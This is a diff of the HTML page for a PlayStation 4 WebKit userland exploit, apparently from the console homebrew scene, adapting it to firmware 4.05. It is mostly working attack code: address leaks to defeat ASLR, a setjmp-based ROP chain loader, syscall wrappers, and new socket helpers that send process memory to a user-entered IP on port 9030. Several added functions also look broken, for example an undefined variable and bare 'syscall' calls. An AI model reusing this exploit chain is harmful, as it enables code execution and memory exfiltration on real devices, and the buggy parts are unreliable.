@@ -1,7 +1,7 @@
 <!-- This page was originally made by qwertyoruiopz -->
 <html>
 <head>
-  <title>JailbreakMe PS4 3.5x/3.70/4.0x</title>
+  <title>PS4 Userland Exploitation 4.05</title>
   <meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
   <meta name="apple-mobile-web-app-capable" content="no">
   <meta name="format-detection" content="telephone=no">
@@ -41,38 +41,30 @@
   <script>
     /* Get user agent for determining system firmware */
     var ua = navigator.userAgent;
-
     /* Called from exploit.js upon success */
     window.postexploit = function(p)
     {
       var fwFromUA = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
       document.getElementById("clck").style.display = 'none';
-
       var print = function(string) {
         document.getElementById("console").innerHTML += string + "\n";
       }
-
+      window.nogc = [];
       print("=== Exploit Successful ===");
-
       /* Used to leak parseFloat() for deriving webkit's base address and calling */
       p.leakFunction = function(smashFunction) {
         var smashObj  = p.leakval(smashFunction);
         var smashBase = p.read8(smashObj.add32(0x18));
         return smashBase.add32(0x20);
       }
-
       var funcPointer = p.read8(p.leakFunction(parseFloat));
-
       /* Calculate slide */
       var webkitBase = funcPointer.add32(0); // copy
       webkitBase.low &= ~0xFFF;
       webkitBase.sub32inplace(0x55000);
-
       moduleBaseAddresses['libSceWebKit2']  = webkitBase;
-
       /* Get import map based on firmware from user-agent string */
       generateBasicImportMap();
-
       if(window.basicImportMap[fwFromUA] != null)
       {
         window.basicImports = window.basicImportMap[fwFromUA];
@@ -81,7 +73,11 @@
       {
         throw new Error("System may be vulnerable but does not have a valid import map!");
       }
-
+      /* Get LIBC base address */
+      var libcBase = p.read8(webkitBase.add32(0x2729740));
+      libcBase.low &= ~0xFFF;
+      libcBase.sub32inplace(0x36000);
+      moduleBaseAddresses['libSceLibcInternal']  = libcBase;
       /*
         I was originally going to calculate libkernel's address via libSceSysmodule
         however since we may require libkernel's address for some gadgets in the future
@@ -89,13 +85,10 @@
       */
       var libkernel = p.read8(window.basicImports['__stack_chk_fail']);
       libkernel.low &= ~0xFFF;
-      libkernel.sub32inplace(0xd000);
-
+      libkernel.sub32inplace(0x51000);
       moduleBaseAddresses['libkernel']  = libkernel;
-
       /* Get gadget map based on firmware from user-agent string */
       generateGadgetMap();
-
       if(gadgetMap[fwFromUA] != null)
       {
         window.gadgets = gadgetMap[fwFromUA];
@@ -104,7 +97,6 @@
       {
         throw new Error("System may be vulnerable but does not have a valid gadget map!");
       }
-
       /* Get syscall map based on firmware from user-agent string */
       if(syscallMap[fwFromUA] != null)
       {
@@ -114,36 +106,25 @@
       {
         alert("Your system does not have a valid system call map! The exploit will still work but calling syscalls will not function properly...");
       }
-
-      /* Print out results */
-      print("WebKit Base Located - Address: 0x" + webkitBase);
-      print("LibKernel Base Located - Address: 0x" + libkernel);
-
       var funcPtrStore = p.leakFunction(parseFloat);
       var funcArgs = [];
-
       for(var i = 0; i < 0x7FFF; i++)
         funcArgs[i] = 0x41410000 | i;
-
       /* Ensure everything is aligned and the layout is intact */
       var argBuffer = new Uint32Array(0x1000);
       var argPointer = p.read8(p.leakval(argBuffer).add32(0x28));
       argBuffer[0] = 0x13371337;
-
       if(p.read4(argPointer) != 0x13371337)
       {
         throw new Error("Stack frame is not aligned!");
       }
-
       window.dont_tread_on_me = [argBuffer];
-
       /* Load ROP chain into memory */
       p.loadchain = function(chain)
       {
         var stackPointer = 0;
         var stackCookie = 0;
         var origRIP = 0;
-
         var reEntry =
         {
           length:
@@ -152,39 +133,30 @@
             {
               origRIP = p.read8(stackPointer);
               var returnToFrame = stackPointer;
-
               var ocnt = chain.count;
               chain.push64(stackPointer, origRIP);
               chain.push64(stackPointer.add32(8), stackCookie);
-
               if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
-
               chain.push(window.gadgets["pop rsp"]);
               chain.push(returnToFrame);
               chain.count = ocnt;
-
               p.write8(stackPointer, window.gadgets["pop rsp"]);
               p.write8(stackPointer.add32(8), chain.ropChainPtr);
-
               return 0;
             }
           }
         };
-
         return (function()
         {
           /* Clear stack frame */
           (function(){}).apply(null, funcArgs);
-
           /* Recover frame */
           var orig = p.read8(funcPtrStore);
           p.write8(funcPtrStore, window.gadgets["mov rax, rdi"]);
-
           /* Setup frame */
           var trap = p.leakval(parseFloat());
           var rtv = 0;
           var fakeval = new int64(0x41414141, 0xffff0000);
-
           (function()
           {
             var val = p.read8(trap.add32(0x100));
@@ -193,81 +165,192 @@
               throw new Error("Stack frame corrupted!");
             }
           }).apply(null, funcArgs);
-
           /* Write vtable, setjmp stub, and 'jump rax' gadget */
           p.write8(argPointer, argPointer.add32(0x100));
           p.write8(argPointer.add32(0x130), window.basicImports["setjmp"]);
           p.write8(funcPtrStore, window.gadgets["jmp addr"]);
-
           /* Clear and write to frame */
           (function(){}).apply(null, funcArgs);
           p.write8(trap.add32(0x18), argPointer);
           p.leakval(parseFloat()); // Jumps to "setjmp" function stub in libkernel
-
           /* Finish by resetting the stack's base pointer and canary */
           stackPointer = p.read8(argPointer.add32(0x10));
           stackCookie = p.read8(stackPointer.add32(8));
-
           rtv=Array.prototype.splice.apply(reEntry);
           p.write8(trap.add32(0x18), fakeval);
           p.write8(trap.add32(0x18), orig);
-
           return p.leakval(rtv);
         }).apply(null, funcArgs);
       }
-
       p.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
-        var chain = new rop(p);
+        var retVal;
+        var addr = undefined;
+        var chain = new rop(p, addr);
         chain.call(rip, rdi, rsi, rdx, rcx, r8, r9);
-
         chain.push(window.gadgets["pop rdi"]);
-        chain.push(chain.ropChainPtr.add32(0x3ff8));
+        chain.push(chain.ropChainPtr.add32(0xfff8));
         chain.push(window.gadgets["mov qword ptr [rdi], rax"]);
         chain.push(window.gadgets["pop rax"]);
         chain.push(p.leakval(0x41414242));
-
-        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
-
-        /*
-          Originally for some reason, it will read in hex, so .toString(10)
-          converts back to decimal.
-        */
-        return p.read8(chain.ropChainPtr.add32(0x3ff8)).toString(10);
+        if (chain.run().low != 0x41414242) throw new Error("Unexpected ROP behaviour");
+        retVal = p.read8(chain.ropChainPtr.add32(0xfff8));
+        /* If this check is true, errno was set and function returned -1 */
+        if(retVal.low == 0xFFFFFFFF && retVal.hi == 0xFFFFFFFF)
+        {
+          /* Recursion FTW! */
+          //retVal = p.call(libkernel.add32(0x7ccf0)); // replace this is only 3.55 offset
+          /* Dereference the pointer to get the value of errno */
+          retVal = p.read8(libkernel.add32(0x7ccf0));
+          //alert("ERRNO SET: " + retVal);
+          retVal = -1;
+        }
+        return retVal;
       }
-
       p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
       {
         if (typeof sysc == "string")
         {
           sysc = window.syscallnames[sysc];
         }
-
         if (typeof sysc != "number")
         {
           throw new Error("System call map does not contain an index for this syscall!");
         }
-
         var off = window.syscalls[sysc];
         if (off == undefined)
         {
           throw new Error("System call map does not contain an index for this syscall!");
         }
-
         return p.call(libkernel.add32(off), rdi, rsi, rdx, rcx, r8, r9);
       }
-
-      p.readstr = function(addr){
-        var addr_ = addr.add32(0);
-        var rd = p.read4(addr_);
-        var buf = "";
-        while (rd & 0xFF)
-        {
-          buf += String.fromCharCode(rd & 0xFF);
-          addr_.add32inplace(1);
-          rd = p.read4(addr_);
-        }
-        return buf;
+      p.writeString = function (addr, str)
+      {
+          for (var i = 0; i < str.length; i++)
+          {
+              //p.write4(addr.add32(i), str.charCodeAt(i));
+              var byte = p.read4(addr.add32(i));
+              byte &= 0xFFFF0000;
+              byte |= str.charCodeAt(i);
+              p.write4(addr.add32(i), byte);
+          }
       }
+      p.readString = function(addr)
+      {
+        var byte = p.read4(addr);
+        var str  = "";
+        while (byte & 0xFF)
+        {
+          str += String.fromCharCode(byte & 0xFF);
+          addr.add32inplace(1);
+          byte = p.read4(addr);
+        }
+        return str;
+      }
+      p.socket = function()
+      {
+        return p.syscall('sys_socket', 2, 1, 0); // 2 = AF_INET, 1 = SOCK_STREAM, 0 = TCP
+      }
+      p.connect = function(s, ip, port)
+      {
+        var sockAddr    = new Uint32Array(0x10);
+        var sockAddrPtr = p.read8(p.leakval(sockAddr).add32(0x28));
+        var ipSegments  = ip.split('.');
+        for(var seg = 0; seg < 4; seg++)
+        {
+          ipSegments[seg] = parseInt(ipSegments[seg]);
+        }
+        sockAddr[0] |= (((port >> 8) & 0xFF) << 0x10 | port << 0x18) | 0x200;
+        sockAddr[1]  = ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
+        sockAddr[2]  = 0;
+        sockAddr[3]  = 0;
+        return p.syscall('sys_connect', s, sockAddrPtr, 0x10);
+      }
+      p.writeSocket = function(s, data, size)
+      {
+        return p.syscall('sys_write', s, data, size);
+      }
+      p.closeSocket = function(s)
+      {
+        return p.syscall('sys_close', s);
+      }
+      window.dumpMemory = function(addr, size, ip)
+      {
+        var s = p.socket();
+        if(p.connect(s, ip, 9030) != 0)
+          return -1;
+        p.writeSocket(s, addr, size);
+        p.closeSocket(s);
+      }
+      /* Setup memory for data */
+      function malloc(size)
+      {
+        var backing = new Uint8Array(0x10000+size);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x28));
+        ptr.backing = backing;
+        return ptr;
+      }
+      function stringify(str)
+      {
+        var bufView = new Uint8Array(str.length+1);
+        for (var i=0; i<str.length; i++) {
+            bufView[i] = str.charCodeAt(i) & 0xFF;
+        }
+        window.nogc.push(bufView);
+        return p.read8(p.leakval(bufView).add32(0x28));
+      }
+
+
+	  function sys_dynlib_get_list(loop, ip)
+{
+ if(loop != "true"){
+    var buffer = malloc(0x408);
+    syscall(592,malloc.add32(0x8), 256 , malloc); 
+    window.dumpMemory(buffer,0x408, ip);
+}
+   else
+{
+    var buffer = malloc(0x408);
+    syscall(592,malloc.add32(0x8), 256 , malloc);
+    alert(); 
+    var count = p.read4(buffer);
+    sys_dynlib_get_info_ex_looped(count, buffer, ip)
+}
+
+
+}
+	  
+	function sys_dynlib_get_info_ex(modhandl, ip )
+{
+	var moduleHandle = parseInt(modhandl, 16);
+	var buffer = malloc(0x1a8);
+	p.write4(buffer, 0x1a8);
+	syscall(608, moduleHandle, 0, buffer);
+	window.dumpMemory(buffer, 0x1a8, ip);
+}  
+
+function sys_dynlib_get_info(modulehandl, ip)
+{   var moduleHandle = parseInt(modhandl, 16);
+    var buffer = malloc(0x160);
+      p.write8(buffer, 0x160);
+    syscall(593, moduleHandle,  buffer);
+     window.dumpMemory(buffer, 0x160, ip);
+}
+
+function sys_dynlib_get_info_ex_looped(count,data, ip)
+{
+     var buffer = malloc(0x1a8*count);
+	 
+    for(var index = 0; index < count; index++)
+        {
+			 p.write8((buffer+0x1a8*index), 0x1a8);
+             syscall(608, p.read4(data + index * 4), buffer.add32(index*0x1a8));
+             window.dumpMemory(buffer, 0x1a8*count, ip);
+
+        }
+}
+
+
 
 
 
@@ -279,30 +362,26 @@
         ez mode.
       */
 
-      var idx = 0;
+      
 
-      window.trycall = function() {
-        print("call ret: " + p.call(window.gadgets["mov rax, rdi"], idx));
-        idx++;
-      }
+      print("<p>Enter your ip address in the textbox below </p>");
+      print("<p>Your computer should listen to port 9030</p>");
+      print('IP Address:'+'<input type="text" id="ip"  value="0.0.0.0"><br>');
+	  print('Module Handle 0x:'+'<input type="text" id="mhandle"  value="0"><br>');
+      print('<a href=javascript:sys_dynlib_get_info_ex(document.getElementById("mhandle").value,document.getElementById("ip").value);>try sys_dynlib_get_info_ex(int moduleHandle, string ip)</a>');
+      print("Loop:"+'<input type="checkbox" title="enabling loop will get the module info for every returned handle" id="looping"  value="0"><br>');
+      print('<a href=javascript:sys_dynlib_get_list(document.getElementById("looping").checked,document.getElementById("ip").value );>try sys_dynlib_get_list(boolean loop, string ip) </a>');
+	  print('Module Handle 0x:'+'<input type="text" id="mhandle2"  value="0"><br>');
+      print('<a href=javascript:sys_dynlib_get_info(document.getElementById("mhandle2").value,document.getElementById("ip").value);>try sys_dynlib_get_info(int moduleHandle, string ip)</a>');
 
-      window.getPID = function() {
-        print("sys_getpid(): " + p.syscall("sys_getpid"));
-      }
-
-      window.getUID = function() {
-        print("sys_getuid(): " + p.syscall("sys_getuid"));
-      }
-
-      print("<a href=javascript:window.trycall();>try call</a>");
-      print("<a href=javascript:window.getPID();>try sys_getpid()</a>");
-      print("<a href=javascript:window.getUID();>try sys_getuid()</a>");
+      //print("<a href=javascript:window.getPID();>try sys_getpid()</a>");
+      //print("<a href=javascript:window.getUID();>try sys_getuid()</a>");
     }
   </script>
   <script src=expl.js></script>
   <script src=gadgets.js></script>
   <script src=rop.js></script>
   <center><h1 id=clck>...</h1><strong>By <a href='https://twitter.com/qwertyoruiopz'>qwertyoruiopz</a></strong><br/>Edited by <a href='https://twitter.com/specterdev'>SpecterDev</a><br/>This exploit has been cleaned up a bit and now has multi-firmware support!<br/></center>
-  <pre id="console" style="font-size: 20px"></pre>
+  <pre id="console" style="font-size: 13px"></pre>
 </body>
 </html>
